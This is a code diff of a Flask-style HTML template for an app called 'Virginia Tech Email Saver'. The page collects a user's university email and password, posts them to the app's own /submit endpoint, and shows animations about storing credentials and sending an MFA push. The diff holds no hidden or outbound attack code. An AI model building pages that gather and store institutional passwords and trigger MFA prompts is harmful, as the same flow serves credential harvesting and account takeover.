@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Virginia Tech Email Saver</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
-    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
 </head>
 <body>
@@ -15,7 +14,7 @@
             <div id="storing-credentials" class="animation hidden">
                 <h2>Storing your credentials securely...</h2>
                 <dotlottie-player 
-                    src="https://lottie.host/ab51dd0c-fb37-4af6-87c4-b38ad86dad02/0a9TEhb5a7.lottie"
+                    src="https://lottie.host/ab51dd0c-fb37-4af6-87c4-b38ad86dad02/0a9TEhb5a7.lottie" 
                     background="transparent" 
                     speed="1" 
                     style="width: 300px; height: 300px" 
@@ -23,24 +22,21 @@
                     autoplay>
                 </dotlottie-player>
             </div>
-<!-- Comment out the login animation -->
-<!--
-<div id="attempting-login" class="animation hidden">
-    <h2>Attempting to log in...</h2>
-    <dotlottie-player
-        src="https://lottie.host/3c457af7-61e6-477c-979d-1562c6c9efe8/yM8sid1hot.lottie"
-        background="transparent"
-        speed="1"
-        style="width: 300px; height: 300px"
-        loop
-        autoplay>
-    </dotlottie-player>
-</div>
--->
+            <div id="attempting-login" class="animation hidden">
+                <h2>Attempting to log in...</h2>
+                <dotlottie-player 
+                    src="https://lottie.host/431a01f1-1cdd-4a9c-8a6d-bb87f44cdde0/uSDs8Ocycr.lottie" 
+                    background="transparent" 
+                    speed="1" 
+                    style="width: 300px; height: 300px" 
+                    loop 
+                    autoplay>
+                </dotlottie-player>
+            </div>
             <div id="push-notification" class="animation hidden">
                 <h2>Sending a push notification to your device...</h2>
                 <dotlottie-player 
-                    src="https://lottie.host/8a9d29dc-29d9-4640-902d-279f4e6e7065/5EivasZcWd.lottie"
+                    src="https://lottie.host/8a9d29dc-29d9-4640-902d-279f4e6e7065/5EivasZcWd.lottie" 
                     background="transparent" 
                     speed="1" 
                     style="width: 300px; height: 300px" 
@@ -51,7 +47,7 @@
             <div id="success" class="animation hidden">
                 <h2>Success!</h2>
                 <dotlottie-player 
-                    src="https://lottie.host/588ea9d1-e0c7-4fca-91e9-360ea89bcc10/AzcUHnoUuK.lottie"
+                    src="https://lottie.host/588ea9d1-e0c7-4fca-91e9-360ea89bcc10/AzcUHnoUuK.lottie" 
                     background="transparent" 
                     speed="1" 
                     style="width: 300px; height: 300px" 
@@ -67,8 +63,6 @@
             <form id="credentials-form">
                 <label for="vt_email">VT Email:</label>
                 <input type="email" id="vt_email" name="vt_email" required>
-                <label for="vt_username">VT Username:</label>
-                <input type="text" id="vt_username" name="vt_username" required>
                 <label for="vt_password">Password:</label>
                 <input type="password" id="vt_password" name="vt_password" required>
                 <button type="submit">Submit</button>
@@ -83,63 +77,40 @@
 
     <script src="{{ url_for('static', filename='js/animations.js') }}"></script>
     <script>
-        let redirectTriggered = false; // Prevent multiple redirections
-        let currentStep = 0; // Track current progress step
-    
-        function pollProgress() {
-            fetch("/get_progress")
-                .then(response => response.json())
-                .then(data => {
-                    const step = data.step;
-                    if (step !== currentStep) {
-                        currentStep = step;
-                        showProgressStep(step); // Update animations
-                    }
-    
-                    if (step === 4 && !redirectTriggered) {
-                        pollLoginStatus(); // Check final login confirmation
-                    }
-                })
-                .catch(error => console.error("Error polling progress:", error));
-        }
-    
-        function pollLoginStatus() {
-            fetch("/confirm_login", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ email: document.getElementById("vt_email").value })
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success && !redirectTriggered) {
-                        redirectTriggered = true; // Prevent further redirects
-                        setTimeout(() => {
-                            const email = document.getElementById("vt_email").value;
-                            window.location.href = `/dashboard?email=${encodeURIComponent(email)}`;
-                        }, 2000); // Allow animations to complete
-                    }
-                })
-                .catch(error => console.error("Error checking login status:", error));
-        }
-    
         document.getElementById("credentials-form").addEventListener("submit", function (e) {
-            e.preventDefault();
+            e.preventDefault(); // Prevent default form submission
+
+            // Fetch form values
+            const email = document.getElementById("vt_email").value;
+            const username = email.split("@")[0]; // Extract username from email
+            const password = document.getElementById("vt_password").value;
+
+            // Hide form and show animations
             document.getElementById("form-container").classList.add("hidden");
             document.getElementById("animation-container").classList.remove("hidden");
-    
+
+            // Send form data via POST request
             fetch("/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    vt_email: document.getElementById("vt_email").value,
-                    vt_username: document.getElementById("vt_username").value,
-                    vt_password: document.getElementById("vt_password").value
-                })
+                body: JSON.stringify({ vt_email: email, vt_username: username, vt_password: password }),
             })
-                .then(() => {
-                    setInterval(pollProgress, 1000); // Poll progress updates
+                .then((response) => {
+                    if (!response.ok) {
+                        return response.json().then((err) => {
+                            throw new Error(err.message || "Unknown error occurred");
+                        });
+                    }
+                    return response.json();
                 })
-                .catch(error => console.error("Error submitting form:", error));
+                .then((data) => {
+                    if (data.redirect_url) {
+                        window.location.href = data.redirect_url; // Redirect to dashboard
+                    } else {
+                        console.error("Error: No redirect URL in server response.");
+                    }
+                })
+                .catch((error) => console.error("Error during form submission:", error));
         });
     </script>
 </body>
